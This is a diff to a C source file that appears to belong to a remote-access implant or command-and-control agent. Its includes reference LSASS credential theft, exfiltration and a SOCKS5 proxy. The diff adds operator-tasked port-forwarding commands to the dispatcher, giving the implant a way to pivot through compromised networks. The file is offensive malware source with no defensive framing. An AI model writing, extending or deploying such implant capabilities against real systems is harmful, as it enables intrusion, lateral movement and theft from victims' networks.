@@ -23,6 +23,7 @@
 #include "../../include/credentials/lsass.h"
 #include "../../include/exfil/exfil.h"
 #include "../../include/network/socks5.h"
+#include "../../include/network/portfwd.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -194,6 +195,12 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_SOCKS5_START;
   if (str_icmp(cmd, "socks5_stop") == 0)
     return CMD_SOCKS5_STOP;
+  if (str_icmp(cmd, "portfwd_add") == 0)
+    return CMD_PORTFWD_ADD;
+  if (str_icmp(cmd, "portfwd_remove") == 0)
+    return CMD_PORTFWD_REMOVE;
+  if (str_icmp(cmd, "portfwd_list") == 0)
+    return CMD_PORTFWD_LIST;
 
   return CMD_NONE;
 }
@@ -755,6 +762,64 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         status = STATUS_SUCCESS;
       }
       result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+
+
+  case CMD_PORTFWD_ADD:
+    {
+      // Format: "localPort,destHost,destPort" (localPort 0 = auto)
+      int localPort = 0;
+      char destHost[256] = {0};
+      int destPort = 0;
+      
+      if (task->args) {
+        sscanf(task->args, "%d,%255[^,],%d", &localPort, destHost, &destPort);
+      }
+      
+      int fwdId = PortFwd_Create((USHORT)localPort, destHost, (USHORT)destPort);
+      if (fwdId > 0) {
+        char msg[128];
+        snprintf(msg, sizeof(msg), "Port forward created (ID: %d)", fwdId);
+        result->output = str_dup(msg);
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to create port forward");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_PORTFWD_REMOVE:
+    {
+      int id = 0;
+      if (task->args) id = atoi(task->args);
+      
+      if (PortFwd_Remove(id)) {
+        result->output = str_dup("Port forward removed");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to remove port forward (not found?)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_PORTFWD_LIST:
+    {
+      char* json = NULL;
+      if (PortFwd_List(&json)) {
+        result->output = json;
+        result->output_len = json ? strlen(json) : 0;
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to list port forwards");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
     }
     break;
 
